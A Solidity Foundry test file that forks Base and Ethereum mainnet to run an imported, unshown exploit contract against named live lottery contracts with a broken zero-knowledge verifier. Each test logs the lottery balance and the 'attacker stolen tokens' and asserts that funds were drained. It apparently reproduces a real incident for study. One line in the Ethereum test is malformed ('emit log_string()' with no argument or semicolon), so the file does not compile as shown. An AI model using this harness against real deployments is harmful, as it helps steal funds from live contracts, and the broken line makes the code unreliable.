// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/FoomExploit.sol";

contract FoomExploitTest is Test {
    address constant BASE_LOTTERY = 0xdb203504ba1fea79164AF3CeFFBA88C59Ee8aAfD;
    address constant BASE_VERIFIER = 0x02c30D32A92a3C338bc43b78933D293dED4f68C6;
    address constant BASE_TOKEN = 0x02300aC24838570012027E0A90D3FEcCEF3c51d2;
    address constant ETH_LOTTERY = 0x239AF915abcD0a5DCB8566e863088423831951f8;
    address constant ETH_VERIFIER = 0xc043865fb4D542E2bc5ed5Ed9A2F0939965671A6;
    address constant ETH_TOKEN = 0xd0D56273290D339aaF1417D9bfa1bb8cFe8A0933;

    function testExploit_Base() public {
        vm.createSelectFork("base", 42650620);

        address attacker = makeAddr("attacker");
        FoomExploit exploit = new FoomExploit();

        uint256 lotteryBefore = IERC20(BASE_TOKEN).balanceOf(BASE_LOTTERY);

        emit log_string("============================================");
        emit log_string("BASE CHAIN EXPLOIT (block 42650620)");
        emit log_string("");
        emit log_named_address("Victim Lottery", BASE_LOTTERY);
        emit log_named_address("Broken ZK Verifier", BASE_VERIFIER);
        emit log_named_address("Drained Token", BASE_TOKEN);
        emit log_named_uint("Lottery token balance BEFORE", lotteryBefore);
        emit log_string("--------------------------------------------");

        exploit.attack(BASE_LOTTERY, 10, attacker);

        uint256 lotteryAfter = IERC20(BASE_TOKEN).balanceOf(BASE_LOTTERY);
        uint256 stolen = IERC20(BASE_TOKEN).balanceOf(attacker);

        emit log_named_uint("Lottery token balance AFTER", lotteryAfter);
        emit log_named_uint("Attacker stolen tokens", stolen);
        emit log_named_uint("Drain percentage (bps)", (stolen * 10000) / lotteryBefore);
        emit log_string("============================================");

        assertGt(stolen, 0, "BASE: exploit should drain tokens");
    }

    function testExploit_Eth() public {
        vm.createSelectFork("mainnet", 24539648);

        address attacker = makeAddr("attacker");
        FoomExploit exploit = new FoomExploit();

        uint256 lotteryBefore = IERC20(ETH_TOKEN).balanceOf(ETH_LOTTERY);

        emit log_string("============================================");
        emit log_string("ETH MAINNET EXPLOIT (block 24539648)");
        emit log_string()
        emit log_named_address("Victim Lottery", ETH_LOTTERY);
        emit log_named_address("Broken ZK Verifier", ETH_VERIFIER);
        emit log_named_address("Drained Token", ETH_TOKEN);
        emit log_named_uint("Lottery token balance BEFORE", lotteryBefore);
        emit log_string("--------------------------------------------");

        exploit.attack(ETH_LOTTERY, 30, attacker);

        uint256 lotteryAfter = IERC20(ETH_TOKEN).balanceOf(ETH_LOTTERY);
        uint256 stolen = IERC20(ETH_TOKEN).balanceOf(attacker);

        emit log_named_uint("Lottery token balance AFTER", lotteryAfter);
        emit log_named_uint("Attacker stolen tokens", stolen);
        emit log_named_uint("Drain percentage (bps)", (stolen * 10000) / lotteryBefore);
        emit log_string("============================================");

        assertGt(stolen, 0, "ETH: exploit should drain tokens");
    }
}
